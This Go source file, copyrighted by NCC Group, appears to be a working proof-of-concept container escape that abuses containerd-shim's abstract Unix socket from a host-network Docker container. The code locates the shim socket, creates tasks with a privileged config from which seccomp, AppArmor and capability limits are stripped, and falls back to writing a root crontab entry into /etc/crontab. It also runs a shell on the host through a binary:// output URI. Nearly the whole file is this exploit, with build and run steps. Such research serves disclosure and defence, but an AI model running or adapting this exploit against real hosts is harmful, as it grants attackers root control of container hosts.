/*
Copyright 2020 NCC Group

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package main

// $ go build

// $ docker build -t abstractshimmer .
// $ docker run --rm -d --network host abstractshimmer | xargs docker logs -f

// $ cat /tmp/shimmer.out
// $ cat /tmp/shimmer.binary
// $ # for containerd 1.2.x
// $ cat /etc/crontab

// note: this will leave docker/containerd a bit out of sorts. there will be
//       a dangling containerd-shim and docker container that need to be killed
//       and `docker rm --force`'d respectively to clean things up a bit.
//       /var/lib/containerd/io.containerd.runtime.v1.linux/moby/ and
//       /run/containerd/io.containerd.runtime.v1.linux/moby/ will have some
//       leftovers as well

import (
  "os"
  "strings"
  "github.com/containerd/containerd/pkg/dialer"
  "context"
  "fmt"
  "net"
  "os/exec"
  "time"
  "io/ioutil"
  "github.com/pkg/errors"

  "github.com/containerd/ttrpc"
  shimapi "github.com/containerd/containerd/runtime/v1/shim/v1"
  ptypes "github.com/gogo/protobuf/types"

  "golang.org/x/crypto/ssh/terminal"
  "encoding/json"
)

func isJsonObject(s string) bool {
  var js map[string]interface{}
  return json.Unmarshal([]byte(s), &js) == nil
}

func readStdin() (string, error) {
  bytes, err := ioutil.ReadAll(os.Stdin)
  if err != nil {
    return "", err
  }
  return string(bytes), nil
}

type Result struct {
    Input string
    Error error
}

func main() {
  if terminal.IsTerminal(int(os.Stdout.Fd())) {
    stage1()
  } else {
    c := make(chan Result, 1)

    go func() {
      text, err := readStdin()
      c <- Result {
        Input: text,
        Error: err,
      }
    }()

    var result Result

    select {
    case res := <-c:
      result = res
    case <-time.After(2 * time.Second):
      result = Result{
        Input: "",
        Error: nil,
      }
    }

    if result.Input == "" {
      stage1()
    } else {
      if isJsonObject(result.Input) {
        stage2(result.Input)
      } else if strings.Index(result.Input, "crontab") != -1 {
        stage2old()
      } else {
        stage3(result.Input)
      }
      time.Sleep(2 * time.Second)
    }
  }
}

func getId() string {
  cmd := exec.Command("/bin/sh", "-c", "cat /proc/self/cgroup | grep name= | sed -E 's/^.+\\/([a-f0-9]+)$/\\1/g'")
  out, err := cmd.Output()
  if err != nil {
    fmt.Printf("err: %s\n", err)
    return ""
  }
  output := string(out)
  return strings.TrimSpace(output)
}

const suffix = ".sock@"
const suflen = len(suffix)
const prefix = "@/containerd-shim/"
const prelen = len(prefix)

func getSocket() (net.Conn, error) {
  sockets, _ := ioutil.ReadFile("/proc/net/unix")
  lines := strings.Split(string(sockets), "\n")
  for _, line := range lines {
    ridx := strings.LastIndex(line, suffix)
    if ridx != -1 {
      lidx := strings.Index(line, prefix)
      if lidx != -1 {
        socket := line[lidx+1:ridx+suflen-1]
        conn, err := dialer.Dialer("\x00"+socket, 5*time.Second)
        if err == nil {
          fmt.Printf("using abstract socket: %s\n", socket)
          return conn, nil
        }
      }
    }
  }
  return nil, errors.Errorf("could not find suitable socket")
}

func stage1() {
  ctx := context.Background()

  md := ttrpc.MD{}
  md.Set("containerd-namespace-ttrpc", "notmoby")
  ctx = ttrpc.WithMetadata(ctx, md)

  conn, err := getSocket()
  if err != nil {
    fmt.Printf("err: %s\n", err)
    return
  }

  client := ttrpc.NewClient(conn, ttrpc.WithOnClose(func() {
    fmt.Printf("connection closed\n")
  }))
  c := shimapi.NewShimClient(client)

  var empty = &ptypes.Empty{}
  info, err := c.ShimInfo(ctx, empty)
  if err != nil {
    fmt.Printf("err: %s\n", err)
    return
  }
  fmt.Printf("info.ShimPid: %d\n", info.ShimPid)


  containerId := getId()
  bundle := "/run/containerd/io.containerd.runtime.v1.linux/moby/" + containerId
  fmt.Printf("bundle: %s\n", bundle)

  // try payload for newer containerd-shim first
  fmt.Printf("starting phase 2\n");

  // phase 2 container based on our own
  taskResp, err := c.Create(ctx, &shimapi.CreateTaskRequest{
    ID: "phase2_" + containerId[:8],
    Bundle: bundle,
    Terminal: false,
    Stdin: bundle + "/config.json",
    Stdout: "file:///run/containerd/io.containerd.runtime.v1.linux/moby/shimmer_" + containerId[:8] + "/config.json",
    Stderr: "/dev/null",
  })
  if err != nil {
    e := fmt.Sprintf("%s", err)
    if strings.Index(e, "no such file or directory") == -1 {
      fmt.Printf("err: %s\n", err)
      return
    } else {
      fmt.Printf("falling back to crontab for older containerd-shim\n");
      taskResp, err = c.Create(ctx, &shimapi.CreateTaskRequest{
        ID: "phase2_cron_" + containerId[:8],
        Bundle: bundle,
        Terminal: false,
        Stdin: "/etc/crontab",
        Stdout: "/etc/crontab",
        Stderr: "/dev/null",
      })
      if err != nil {
        fmt.Printf("err: %s\n", err)
        return
      }
      fmt.Printf("taskResp.Pid: %d\n", taskResp.Pid)

      startResp, err := c.Start(ctx, &shimapi.StartRequest{
        ID: "phase2_cron_" + containerId[:8],
      })
      if err != nil {
        fmt.Printf("err: %s\n", err)
        return
      }
      fmt.Printf("startResp.Pid: %d\n", startResp.Pid)
      time.Sleep(2 * time.Second)
      return
    }
  }
  fmt.Printf("taskResp.Pid: %d\n", taskResp.Pid)

  startResp, err := c.Start(ctx, &shimapi.StartRequest{
    ID: "phase2_" + containerId[:8],
  })
  if err != nil {
    fmt.Printf("err: %s\n", err)
    return
  }
  fmt.Printf("startResp.Pid: %d\n", startResp.Pid)

  time.Sleep(2 * time.Second)

  fmt.Printf("starting phase 3\n");

  taskResp, err = c.Create(ctx, &shimapi.CreateTaskRequest{
    ID: "phase3a_" + containerId[:8],
    Bundle: "/run/containerd/io.containerd.runtime.v1.linux/moby/shimmer_" + containerId[:8],
    Terminal: false,
    Stdin: "/proc/cmdline",
    //Stdout: "binary:///bin/sh?-c=cat%20/proc/self/status%20>/tmp/shimmer.binary",
    Stdout: "/dev/null",
    Stderr: "/dev/null",
  })
  if err != nil {
    fmt.Printf("err: %s\n", err)
    return
  }
  fmt.Printf("taskResp.Pid: %d\n", taskResp.Pid)

  startResp, err = c.Start(ctx, &shimapi.StartRequest{
    ID: "phase3a_" + containerId[:8],
  })
  if err != nil {
    fmt.Printf("err: %s\n", err)
    return
  }
  fmt.Printf("startResp.Pid: %d\n", startResp.Pid)

  taskResp, err = c.Create(ctx, &shimapi.CreateTaskRequest{
    ID: "phase3b_" + containerId[:8],
    Bundle: "/run/containerd/io.containerd.runtime.v1.linux/moby/shimmer_" + containerId[:8],
    Terminal: false,
    Stdin: "/proc/cmdline",
    Stdout: "binary:///bin/sh?-c=cat%20/proc/self/status%20>/tmp/shimmer.binary",
    Stderr: "/dev/null",
  })
  if err != nil {
    fmt.Printf("err: %s\n", err)
    return
  }
  fmt.Printf("taskResp.Pid: %d\n", taskResp.Pid)

  startResp, err = c.Start(ctx, &shimapi.StartRequest{
    ID: "phase3b_" + containerId[:8],
  })
  if err != nil {
    fmt.Printf("err: %s\n", err)
    return
  }
  fmt.Printf("startResp.Pid: %d\n", startResp.Pid)

  for i := 0; i < 5; i++ {
    fmt.Printf("waiting...\n")
    time.Sleep(2 * time.Second)
  }
  fmt.Printf("finished\n")

}

func stage2old() {
  fmt.Printf("\n* * * * * root ( echo \"# id\" ; id ; echo \"# cat /proc/self/status\"; cat /proc/self/status ) > /tmp/shimmer.out\n")
}

func stage2(input string) {
  // `--privileged`-ify the config
  cmd := exec.Command("jq", `. | del(.linux.seccomp) | del(.linux.namespaces[3]) | (.process.apparmorProfile="unconfined") | (.process.capabilities.bounding=["CAP_CHOWN","CAP_DAC_OVERRIDE","CAP_DAC_READ_SEARCH","CAP_FOWNER","CAP_FSETID","CAP_KILL","CAP_SETGID","CAP_SETUID","CAP_SETPCAP","CAP_LINUX_IMMUTABLE","CAP_NET_BIND_SERVICE","CAP_NET_BROADCAST","CAP_NET_ADMIN","CAP_NET_RAW","CAP_IPC_LOCK","CAP_IPC_OWNER","CAP_SYS_MODULE","CAP_SYS_RAWIO","CAP_SYS_CHROOT","CAP_SYS_PTRACE","CAP_SYS_PACCT","CAP_SYS_ADMIN","CAP_SYS_BOOT","CAP_SYS_NICE","CAP_SYS_RESOURCE","CAP_SYS_TIME","CAP_SYS_TTY_CONFIG","CAP_MKNOD","CAP_LEASE","CAP_AUDIT_WRITE","CAP_AUDIT_CONTROL","CAP_SETFCAP","CAP_MAC_OVERRIDE","CAP_MAC_ADMIN","CAP_SYSLOG","CAP_WAKE_ALARM","CAP_BLOCK_SUSPEND","CAP_AUDIT_READ"]) | (.process.capabilities.effective=.process.capabilities.bounding) | (.process.capabilities.inheritable=.process.capabilities.bounding) | (.process.capabilities.permitted=.process.capabilities.bounding)`)
  cmd.Stdin = strings.NewReader(input)

  out, _ := cmd.Output()
  output := string(out)
  fmt.Printf("%s", output)

  // stick around, we don't want containerd-shim/runc to delete the files yet
  time.Sleep(10 * time.Second)
}

func stage3(_ string) {
  output := ""

  out, err := ioutil.ReadFile("/proc/self/status")
  output += string(out)
  out, err = ioutil.ReadFile("/proc/self/attr/current")
  output += string(out)

  defer time.Sleep(10 * time.Second)

  cmd := exec.Command("/bin/sh", "-c", "id > /proc/1/root/tmp/shimmer.out")
  err = cmd.Run()
  if err != nil {
    fmt.Printf("err: %s\n", err)
    return
  }

  f, err := os.OpenFile("/proc/1/root/tmp/shimmer.out", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
  if err != nil {
    fmt.Printf("err: %s\n", err)
    return
  }
  if _, err := f.Write([]byte(output)); err != nil {
    fmt.Printf("err: %s\n", err)
    return
  }
  if err := f.Close(); err != nil {
    fmt.Printf("err: %s\n", err)
    return
  }
}
